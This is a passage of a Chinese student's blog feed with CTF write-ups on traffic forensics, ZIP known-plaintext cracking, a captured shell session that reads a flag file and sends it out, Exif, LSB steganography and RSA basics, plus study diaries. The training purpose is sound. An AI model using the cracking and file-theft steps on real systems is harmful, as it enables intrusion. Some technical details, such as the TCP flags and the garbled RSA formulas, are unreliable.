打开wireshark，分析流量的数据，找出SSH的每个过程：&nbsp;&nbsp;&nbsp;①Client端向Server端发起SSH连接请求；&nbsp;&nbsp;&nbsp;②Server端向Client端发起版本协商。&nbsp;&nbsp;&nbsp;③协商结束后Server端发送Host Key公钥 Server Key公钥，随机数等信息。到这里所有通信是不加密的。&nbsp;&nbsp;&nbsp;④Client端返回确认信息，同时附带用公钥加密过的一个随机数，用于双方计算Session Key。&nbsp;&nbsp;&nbsp;⑤进入认证阶段。从此以后所有通信均加密。&nbsp;&nbsp;&nbsp;⑥认证成功后，进入交互阶段。 因为SSH的过程已经明确，所以对于整个流量分析相对就容易了。在思考过程中已经明确了应注重关注NFS，那么在过滤器中只过滤NFS的流量： 在上图中我们可以得到服务器允许客户端进行读（RD）、查找（LU）、修改（MD）、增加（XT）、删除（DL）操作的信息，而客户端对文件进行了查找（以防止覆盖相同名称文件的内容）、打开（这里建立了flag.txt.gz的压缩包）和写的操作； 找到OpcodeWRITE/DATA/CONTENT，然后右击点击showPackt Bytes，得到下图： 设置Decode as Compressed，即可得到flag4. 学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天的总结虽然花的时间比较长，但是我觉得我理解的深度还不够，更需要我认真的去回顾和思考这些问题，切实变成自己的知识。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;明天开始我要减缓进度了，因为我感悟前几天的知识消化的还不到位，明天开始要好好的去总结总结学过的知识点。5.每日一句行胜于言！]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc：PkCrack解题总结 + 学习总结]]></title>
    <url>%2F2019%2F03%2F04%2F2019.03.04%EF%BC%8810%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;花了将近一天的时间终于在刚才把Web：Rapid Typing这道题做出来了，本来是打算做Calculator的，但是每次提交上去返回的页面还是计算页面，并没有返回结果，等写完总结再好好看看那道题，今天我先不总结做出来的题，总结一下前天Misc：PkCrack这道题。 1. 前期准备 工具：Advanced Zip Password Recovery 数据：一个加密zip文件（secret.txt和sqlmap_1.1.10.py）、一个明文zip文件（sqlmap_1.1.10.py）2. 知识储备 什么是明文攻击?明文攻击是指在已知压缩加密文件内某个文件的明文，那么便可以利用该明文对加密文件进行解密，从而得到整个文件的明文。 明文攻击的原理是什么？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要想知道明文攻击的原理，那么先了解一下有关压缩文件加密密码的产生和隐藏：在对zip文件进行加密后，产生的密码会被转成3个32位的key，这3个key被分布在文件数信息位中，如果一个ZIP文件中有多个文件，那么所有文件的密码都一样。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;明文攻击原理就是利用了这一个特性，找到加密ZIP文件中任一文件的明文后，再用相同的方式对该明文进行压缩（无加密），把将这两个压缩包进行对比，分析这两个压缩包相同的文件，将不同点进行分析和计算，两个相同文件在压缩包中的字节数应该相差12个byte，就能得到那3个Key了，这个时候软件可以利用那3个key对其他文件进行解密了，但是我们却不能从这3个key中得到文件密码。3. 解题过程 下载Advanced Archive Password Recovery和实验数据 打开Advanced Archive Password Recovery并选择明文攻击，并选择开始，15秒左右即可破解： 破解成功后，便可得到3个Key：37ea6b6d、cfca6bd4、216d632e 打开secret.txt文件得到flag4. 学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这次的解题相对简单，在知道解题方向后，只需要用Advanced Archive Password Recovery软件直接破解得到flag。前几次的学习经验和教训告诫我，不能为了做题而做题，在得到flag后我又在网上仔细地查了一下有关明文攻击的相关知识，虽然时间相比前面的题短一点，但知道明白了其原理后，这与单单做题的收获完全是不一样的，所以以后不管学习什么，都应该知其所然。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在背了几天《保密概论》后，总感觉它的知识点多、乱，于是今天早晨做了一个思维导图（还没做好），想理清一下思路，背的时候能有个逻辑衔接。于是今天上午我背《保密概论》的时候，明显感觉整知识点很清楚，然后就是背诵的时候更加有逻辑了，所以不管学习什么，一定要有学习好的方法。明天继续完善思维导图，得加紧背诵了。#### 每日一句：对自己所做的事要有必胜的决心！]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc：shell解题总结 + 学习总结]]></title>
    <url>%2F2019%2F03%2F03%2F2019.03.03%EF%BC%889%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前天在写了有关流量分析的总结后，我昨天又趁热打铁把shell这道题做了出来，今天就分析一下这道题的相关问题吧！ 1. 前期准备 工具：wireshark、base64解码器 对象：shell流量包 知识：TCP的建立、传输和释放的过程2. 知识疑问 面对这么多的流量，该从何入手？ 怎么对TCP进行流量追踪？ python中raw_input()的功能是什么？ python中swapcase()的功能是什么？3. 思考过程 面对这么多的流量，该从何入手？对于这个问题，说实话一开始也是无处下手，毕竟题目中也没有给出直接的提示，那我就认真的看了看这两台主机（A：192.168.247.128和B：192.168.247.130）发生了什么： 首先是主机A（port：57636）与主机B（port：80）web服务器建立了TCP连接（三次握手）并请求“shell.php”文档； 主机B（port：53474）与主机A（port：12345）建立TCP连接（），在接下来B向A传输文件时，紧急位（PSH）置为 1，说明该文件是首先传送的； 两台主机传输完毕，连接断开（四次握手，但实际是三次握手，因为本应第二次握手的没有传输文件，所以省去）； 怎么对TCP进行流量追踪？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在分析大概的过程后，我知道应注重对TCP流的分析，那么应该怎样对这么多的数据进行分析呢？在查了wireshark的功能和相关分析方法后，决定用该软件对TCP进行流的追踪：左击SYN=“1”的一栏—>再次右击鼠标—>点击Follow—>TCP Stream在弹出的界面会出来一些代码：其中包括raw_input()和swapcase()，那么他们的功能是什么呢？ python中raw_input()的功能是什么？raw_input() 会从标准输入（sys.stdin）读取一个输入（输入的类型为字符）并返回一个字符串，且尾部的换行符从末尾移除；与input()的区别：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input() 直接读取控制台的输入（任何类型的输入它都可以接收）。而对于 input() ，它希望能够读取一个合法的 python 表达式，即你输入字符串的时候必须使用引号将它括起来，否则它会引发一个 SyntaxError 。 python中swapcase()的功能是什么？python swapcase() 方法用于对字符串的大小写字母进行转换；4. 解题过程&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在了解了这么多的基础知识下，就开始正式的解题过程吧！ 分析两台主机的交互情况。从上面的“思考过程”中可以看到，本题的切入点在于对的TCP流的分析：追踪TCP流，得到下图的信息： 分析TCP流的代码。上图中的信息所描述的大概过程：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①进入www-data@UbuntuServer16的/var/www/html/tmp/flag目录下；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②在该目录下查看flag.text文件（ cat flag.txt）；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③用base64技术对内容进行编码（base64 -w 0 ）；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④把编码后的内容通过大小写字母转换输出（python -c “print raw_input().swapcase()”）； 找到base64编码后的flag： 将该数据保存早记事本中，将字母的大小写进行转化，并进行base64解码；5. 学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天也做过这个题，因为当时没有深入研究它整个过程是怎样的，也没有去了解该怎么对TCP进行分析，所以当时解题并没有成功，但是随着这几天自己对CTF题的不断的理解，让我面对CTF题时更加稳重和善于思考了，也许这就是这几天我的一个小小的进步吧。6. 每日一句**因为不甘平庸，所以选择拼搏与汗水！**]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc：Exif 解题总结 + 学习总结]]></title>
    <url>%2F2019%2F03%2F02%2F2019.03.02%EF%BC%888%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天详细的介绍了有关HTTP协议的流量分析，那么今天就来说一下Misc：Exif这道题目的详细内容吧。 1. 前期准备 知识点：exif、编码类型 工具：ExifTool2.相关知识 Exif介绍可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。（以上来源百度百科）这些属性信息主要包括：光圈大小、快门速度、白平衡、ISO速度、焦距大小、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码等信息。 如何查看Exif信息 本地查看：在Windows环境下右击图片—&gt;属性—&gt;详细信息； 在线查看：打开exif查看网站，将图片进行上传即可得到图片的exif； 软件查看：下载exif查看工具，将图片用ExifTool打开；注：要想获得详细准确的参数信息，需要专业软件打开图片 常见编码方式 hex ASCII编码 UUencode编码 URL编码 Unicode编码 Base64/32/16编码3. 解题过程 一开始我选择的exif查看工具是在线查看器，在IPTC下发现了“Source：Blue-Whale”可疑之处，于是我详细的又看了一下是否有可疑数据，发现“Credit：102,108,97,103,123,101,120,105,1”与ASCII编码后的结果一样； 在与ASCII表对照后，得出下面的结果："flag{exiSOH"看到这个结果有“flag”，立刻感觉与答案更近了一步，但是这个形式有问题，这个时候我想到题目中给的提示“Note：有的小伙伴用的工具显示不全。搞不出来的可以试试我用的命令行工具exiftool。”于是我又尝试了通过专业软件进行查看exif； 下载“ExifTool”软件，并用该软件打开图片，得到图片详细并完整的信息，于是我查找“credit”的参数（看到数据后，发现在线看到的数据是不完整的）：![](https://wx2.sinaimg.cn/mw690/9b08638bly1g0okpzbc1yj20hv04jwej.jpg) 对照ASCII表写出相应的字符："flag{exif_hidden_fl4g}"4. 解题感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我个人认为这道题的难度不算大，因为题目中给的提示已经很明确了，并且只需要用工具打开图片，并且找到隐藏的信息。但是在解题过程中，有一个问题也是花了不少时间： 在那么多的信息中，找到被编码后的信息：因为我对各种编码的原理并不是很了解。如果不是题目中有“Blue-Whale”提示词，我估计也将会花费很大的时间，以后还得要了解一下有关各种编码的原理。5. 学习总结 学习内容 《保密概论》第五章的背诵 解出Misc部分的Invisible flag和Shell题目 英语口语的自我介绍 学习感悟我写博客已经有7天了，一开始还为自己的专业基础问题和复试备考时间担心，害怕自己不能完成任务，也担心自己的复习时间。然而经过这7天的努力，我合理的安排了复习时间和测试时间，复试备考和测试有序的进行着。虽然在分数上我和别人有一些差距，但是我努力的去理解每道题的知识，并通过自己的理解写出来，让我加深了对知识点的理解和感悟，这种学习对我无疑是有益的。今后我会不断对学过的知识进行总结，形成我自己的知识体系。#每日一句：比你优秀的人还要努力，你自己有什么理由选择安逸！]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc：Forensics1 解题总结]]></title>
    <url>%2F2019%2F03%2F01%2F2019.03.01%EF%BC%887%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天解出了两道题目：Misc：Forensics1和Misc：Exif，因为以前接触过流量分析和HTTP的知识，今天就先写一下关于Forensics1这道题的总结吧！ 1. 前期准备 工具：wireshark 知识：HTTP协议（协议过程、请求方法）2.HTTP有关知识1) HTTP介绍&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP协议（HyperText Transfer Protocol，超文本传输协议）是用于从WWW服务器传输超文本到本地浏览器的传送协议。它是一个基于TCP/IP的属于应用层协议，工作模式为客户/服务器模式，HTTP协议是无连接、无状态的协议，端口号默认为80。 2) HTTP工作流程&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 客户端与服务器建立连接（TCP连接）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 客户端向服务器发送请求&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 服务器响应客户端的请求，返回结果&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ …………&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ 文件传输完毕，连接断开注：HTTP1.0 和HTTP1.1工作流程有所差别，那么有什么差别呢？ 3) HTTP1.0 和HTTP1.1的区别 HTTP 1.0协议使用非持久连接，浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求。 HTTP/1.1默认使用持久连接，在同一个TCP连接中可以传送多个HTTP请求和响应，多个请求和响应可以同时进行，比如一个包含有多个图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。 4) HTTP的请求方法 GET：从指定的资源请求数据； POST：向指定的资源提交要被处理的数据，主要是表格； HEAD：与 GET 相同，但只返回 HTTP 报头，不返回文档主体； PUT：上传指定的 URI 表示； DELETE：删除指定资源； OPTIONS：返回服务器支持的 HTTP 方法； CONNECT：把请求连接转换到透明的 TCP/IP 通道； 注：GET和POST的区别，点击这里 3. 解题过程&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;既然有关HTTP的知识总结的差不多了，那就正式开始解题了！（PS：以前用wireshark分析过我们宿舍的局域网流量，所以这次解题就相比简单一些）1) 用wireshark打开流量包，在“Display Filters”中添加过滤条件“HTTP only：http”； ![](https://wx3.sinaimg.cn/mw690/9b08638bly1g0njqhik7jj20on03o3yk.jpg) 2)在图中我按照时间的先后，对每个信息进行了排序，现在我将每个序号的大概意思叙述一下： ![](https://wx3.sinaimg.cn/mw690/9b08638bly1g0njs40nhzj211y09tq4f.jpg) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1：客户端A 192.168.245.128的56026端口号（以下简称A）向服务器B；192.168.245.136的8080端口号（以下简称B）发送持久连接（HTTP 1.1）的请求； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2：B向A成功返回网页，返回的网页上的内容为 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里的“text/html”的意思是将文件的content-type设置为text/html的形式，浏览器在获取到这种文件时会自动调用html的解析器对文件进行相应的处理； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3：A向B请求favicon.ico略缩图； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4：B向A返回favicon.ico略缩图； ![](https://wx2.sinaimg.cn/mw690/9b08638bly1g0njx3v0tkj205102lq2v.jpg) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5：A在表格中填写“admin”并进行了提交。在这里因为A提交的表格数据需要B进行处理，所以请求方法由GET变为POST； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6：B将A提交的数据与用户先前设置的密码进行对比，匹配不成功于是B返回给A： **Wrong password ** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7：A重新在表格中填写“test”并进行提交； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8：B将A提交的数据与用户先前设置的密码再次进行对比，匹配不成功于是B还是返回给A： **Wrong password ** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9：A再次重新在表格中填写**“thisisatest”**并进行提交； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10：B将A提交的数据与用户先前设置的密码再次进行对比，匹配成功于是B返回给A下面的网页（网页经过我重新编写，在wireshark中看到的只是代码）： ![](https://wx4.sinaimg.cn/mw690/9b08638bly1g0njzs1yr6j20c60610t5.jpg) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11：A向B请求“s3cret.png”图片文件； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12：B向A返回“s3cret.png”图片文件，这时候在wireshark中看到的是图片的信息，如下图： ![](https://wx2.sinaimg.cn/mw690/9b08638bly1g0nk4jek8uj20ix069dgc.jpg) 3)在明确整个HTTP的过程后，对于要找的flag就已经很明确了，因为这个交互过程，就是A向B请求一个名为“s3cret.png”的图片文件，于是我在wireshark中将该图片导出：Portable Network Graphics右击鼠标——&gt;点击Export Packet Bytes…——&gt;命名格式为图片格式，保存类型为All Files，就可以在保存的文件夹找到该图片： ![](https://wx2.sinaimg.cn/mw690/9b08638bly1g0njqbarz1j20l108o3z9.jpg)4)打开图片，找到flag; 4. 解题感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天的题目真的是让我重新的复习了一遍HTTP协议，而且这次流量分析与我之前在宿舍的实践感觉完全不一样： 这次的实践让我更有针对性，而不是像以前那样胡乱的拿出来一段数据就看； 今天的实践让我更能静下心来，坐在电脑旁认真的去分析每一行的数据； 以前抓过流量后，并看了流量的内容，但是并没有把它落实，今天的两个小时的实践 + 三个小时的博客总结，让我心中感觉对流量分析的能力又变得充实了； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今后我还会用更好的态度，去完成每道题并能够知悉背后的原理，同时也要认真做好总结，把每道题、每个知识点变成我自己的。 #每日一句：年轻人，你还在等什么呢？再不努力就变老了！]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Crypto：What's RSA？解题总结（1）]]></title>
    <url>%2F2019%2F02%2F28%2F2019.02.28%EF%BC%886%EF%BC%89%2F</url>
    <content type="text"><![CDATA[今天解题内容是Crypto：What’s RSA。在本科学习《计算机网络》时，老师在讲解加密和解密的内容时，就对RSA做了简单的介绍，但并没有深入讲它的原理。虽然今天花了很长时间还是没有把它解出来，那就先写一下今天学习关于RSA的知识吧。 1.什么是RSA &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RSA是第一个既能用于数据加密也能用于数字签名的算法，它的命名是以其三位发明者的名字命名——Ron Rivest、 Adi Shamir和Leonard Adleman。 2.RSA算法原理 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 首先选取两个大素数p和q，为了获得更高的安全性，设两数的长度一样； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 计算n = p*q，n为模； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 计算欧拉函数：φ(n)=(p-1)(q-1); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 选取加密密钥e，其与φ(n)互素（互素,就是互为质数,两个数之间除了1之外没有更多的公约数）,这里的e的值如果选择的合适，那么RSA加解密的速度将会很快。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ 使用扩展欧几里得算法求出e模φ(n)的逆元d，即 e\*d ≡ 1 mod φ(n) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥ 公钥为 e 和 n，私钥为 d，p 和 q 可以丢弃，但是必须保密； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑦ 加密消息 m 时，将其看成一个大整数，并把它分为比 n 小的数据组，按下面的式子进行加密： ci ≡ mie mod n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑧ 解密密文 c 时，取每一个加密后的分组 ci 并计算，即 mi ≡ cid mod n例如：p=3,q=11,d=7;φ(n)=(p-1)(q-1); &nbsp;&nbsp;&nbsp;n=p*q=3*11=33, &nbsp;&nbsp;&nbsp;φ(n)=(p-1)(q-1)=210=20 &nbsp;&nbsp;&nbsp;由e\d=1 mod φ(n), &nbsp;&nbsp;&nbsp;e*7=1 mod 20 &nbsp;&nbsp;&nbsp;因为1 mod 20 = e*d mod 20 &nbsp;&nbsp;&nbsp;则7e=20k+1 ,其中k为整数。比如k取1,则e=3。说明： 公钥：n 和 e 私钥：d 加密过程：c 解密过程：m3. 解题总结 已给文件 flag.encrypt（一个加密文件，明文应该含有 flag 信息） rsa_private_key.pem（是含有RSA原始私钥的文档） 解题思路 用OpenSSL将rsa_private_key.pem转换成PKCS8格式 然后再生成公钥 利用公钥打开flag.encrypt加密文件注：本思路是作者今天解题的思路，但是做了很多尝试，在第三步始终没有成功，明天我将继续尝试解密，思路可能会发生改变4. 解题感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天在做这道题的过程中，总感觉自己的知识太不够用了，因为题库中每道题的背后都是一个巨大的知识体系，如果只是为了解题而解题，完全可以在网上找到类似题目的解题步骤，但是我觉得这样对知识的理解并不有利，所以以后在做题时，我还得多花点时间学学相关知识，争取对每道题的原理都会有一个深刻的理解，明天要弄个专门的笔记本，把学习的知识做好笔记，系统的归纳一下。 今晚再好好的看一下关于RSA的知识点，争取明天把这道题解出来！ #明日学习任务 背诵《保密概论》； 学习RSA的涉及到的知识，并记笔记； 解Crypto：What’s RSA？题目，并写Crypto：What’s RSA结题总结（2）； 如果该题很快被解出，继续做Misc：Forensics1题目，并进行总结；]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc:LSB解题总结+学习总结]]></title>
    <url>%2F2019%2F02%2F27%2F2019.02.27%EF%BC%885%EF%BC%89%2F</url>
    <content type="text"><![CDATA[经过查阅和学习有关资料，在不断的实践中，将Misc：LSB题目成功解出，下面就详细的总结一下有关内容，仅供大家参考。 1.前期准备 工具：Stegsolve.jar 环境：Java 知识储备：有关LSB的原理2.相关问题1)为什么要进行图片隐写&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在没接触图片隐形写题之前，我认为安全传递信息的途径是通过数据的加密，让攻击者及时获取信息也得不到相应的明文信息。然而图片隐写的技术，可以更好地将核心信息隐藏起来，更不易被攻击者发现。图片信息隐藏是一种对信息存在本身或信息的存在位置进行保密的保密方式，那么信息隐藏的原理是什么呢？ 2)信息隐藏原理、相关技术 原理：利用载体中存在的冗余信息来隐藏秘密对象，以实现保密通信或者数字签名和认证。 相关技术： 基于空域：主要利用图像中的最低有效位（LSB）进行信息的嵌入； 基于频域：先将原始图像由原本的空间域通过傅里叶变换、DCT变换、小波变换等转化到频率域后，对各频率的系数进行选择更改； 基于压缩域：它的隐藏方法与图片格式有关； 相关载体： 空域：主要载体是BMP、PNG等无损图像 频域：主要载体是JPEG等有损图像 压缩域：从载体的相关格式入手，不同的载体需要不同的嵌入手段 最低有效位（LSB）的原理：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为每个图片的颜色都是由“红”、“绿”、“蓝”三种颜色组成，图片中的其他颜色均可以由这三种颜色混合而成。然而PNG的每种颜色的大小在储存位中占8bit，而LSB隐写原理就是把每种颜色的最后一位进行改写，但是改写后的图片和原图相比，在人的眼中是没有区别的。注：由于今天只详细地学习了LSB的相关内容，所以只讲述LSB的内容，其他相关技术在后期将慢慢学习。3.解题步骤1)配置Java环境：在官网上下载java，并在电脑上配置环境2)下载Stegsolve.jar，并用java打开3)Stegsolve——Analyse——Frame Browser，分别浏览三个颜色通道的每一位，在红色最低位发现一个二维码 4)用微信“扫一扫”，得出flag； 2019.2.27学习总结1. 知识概括1.Python基础 数据变量类型 字符串和编码 使用list和tuple注：学习网站为廖雪峰Python官方教程2.《保密概论》第一、二、三章的背诵回顾2.学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在今天学习Python以及对最低有效位的总结过程中，我慢慢的有了一种感受，不管知识点有多难、多杂，只要用心去学，把真正的精力投入进去，时间长的话一定会有收获的，甚至比自己预想的还要好。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一开始知道要把《保密概论》全部背诵下来，说实在的内心是不愿意的，但是自己努力了那么长的时间，不能被这30多页的内容阻碍。通过这两天的背诵情况来看，我正在按照自己的计划进行着，最后一定会背诵完的，一定要在复试中拿到优异的成绩！今天的内容就到此啦！我买的《白帽子将web安全》到了，我要去读一下这本书啦！ #每日一句：莫让今天的懒惰成为明天的悔狠]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc:docx解题过程+学习总结]]></title>
    <url>%2F2019%2F02%2F26%2F2019.02.26%EF%BC%884%EF%BC%89%2F</url>
    <content type="text"><![CDATA[· 解题进度昨晚经过查阅案例和资料后，终于解出了Misc：docx题目，因为昨天的思考并没有深入，所以今天白天的时候又看看了相关的知识，系统的回顾了一下这道题目，今天就总结一下这道题目的相关内容。 1. 有关知识点 word doxc文件本质 文件的结构 2. 知识详解 word doxc文件本质docx格式的文件本质上是一个ZIP文件：docx 格式文件的主要内容是保存为XML格式的，但文件并非直接保存于磁盘。它是保存在一个ZIP文件中，然后取扩展名为docx。 doxc文件的结构 _rels 表示资源； docProps 表示文档资源 theme 表示主题、格式 Content_types 表示内容类型 3. 解题过程 因为docx文件本质上是一个ZIP文件，所以首先将文档的后缀名改为“zip” 将修改过的文件进行解压，得到docx文件的结构 在解压后的文件夹中会发现Flag.xml，打开该文件既得答案 · 每日学习内容1. 知识概括 Python文本编辑器：命令行和Python的交互式命令 Python基础：数据类型和变量、字符串和编码 《保密概论》第三章的背诵2. 学习感悟 在刚开始接触Python的时候，觉得语言比C++更容易理解，但是它的一些编程思想和C/C++没有太大的差距，不管是什么编程语言“万变不离其宗”，在以后的学习Python以及其他语言时，都应该将这种思想横贯其中。以前也了解过Python，但是从这几天的解题过程中，我慢慢的觉得这门语言是一个很强大的工具，只不过是我还没有掌握这种能力，将促使我一定要掌握住这门语言，我也会认真的学习。 背诵了一上午和半个下午的《保密概论》，内容实在多的不行。刚开始背的时候，觉得这么多怎么可能一字不漏的背完呢？从这两天的情况来看，已经背诵了8页，对于背完还是有信心的，明天继续加油！ #每日一句：要把现在的努力当做一个习惯，自己一定能学有所成！]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建Github+Hexo个人博客总结]]></title>
    <url>%2F2019%2F02%2F25%2F2019.02.25%EF%BC%883%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在学习了关于Python的基础以及Requests，但经过一番尝试后今天还是没有成功解出一道题目，在解题之前我将问题分解以下几个部分：（不知是否正确） 怎么获取服务器上的参与计算的数字？ 获取之后计算过程该怎样？ 如何将计算的结果返回服务器，并进行提交？ 明天我将会继续学习Python基础知识，并围着这三个问题进行学习。前两天创建自己的博客，花了不少时间，在翻阅很多文章后，终于成功创建，下面就总结一下昨天用GitHub和Hexo上创建博客的情况吧。 1、前期准备 操作系统：windows 7 下载git 注册Github账号 下载node.js 下载Hexo Markdown在线编写器marxi 2、正式开始 1)创建GitHub仓库 仓库名称要与用户名一直，固定格式为：用户名称.github.io 2)git与GitHub连接起来（通过SSH秘钥） $ssh-keygon //在命令行提示的路径中找到”id_rsa.pub”文件，并用记事本打开，复制密钥；在GitHub中找到“setting”，然后点击“SSH and GPG keys”，将复制的密钥粘贴到”SSH keys”中 3)确认git和Github成功连接 在指定位置新建一个文件夹，打开git输入 git init //初始化文件夹 git remote add origin 刚才建立的github仓库的地址 //将本地的文件夹与github上的仓库连接起来了 git pull origin master 查看新建的文件夹，是否有Github仓库中的文件，如有则代表连接成功 4)安装Hexo npm install -g hexo-cli 5)在项目文件夹中，右击并点击”Git Bash Here “ hexo init //初始化文件夹hexo install //安装一些依赖包npm install hexo-deployer-git —save //安装插件 6)用Visual Studio Code打开项目文件夹中的.config.yml文件 type: gitrepo: github仓库的地址branch: master注意：“：”后要有一个空格（Markdown语法规定） 7)把hexo的博客部署在github仓库中 hexo g -d //这时的网址为Hexo默认样式 8)更改博客样式 增加博客文章：项目文件夹/source/_posts 新建.md文件，并用Markdown语言编写。注：每次修改完本地Hexo的文件夹中的文件，都要hexo g -d 对Github仓库进行重新配置。 更改博客主题：打开Hexo官网——&gt;Theme——&gt;选择自己喜欢的，按照安装要求进行安装，并在项目文件夹/theme/主题名称 的.cofig.yml修改样式的内容。 说明：本博文可能在内容上出现差错，作者还将检查并进行修改。]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc:Signin/Misc:Poem/Misc:Birthday解题总结]]></title>
    <url>%2F2019%2F02%2F24%2F2019.02.24%EF%BC%882%EF%BC%89%2F</url>
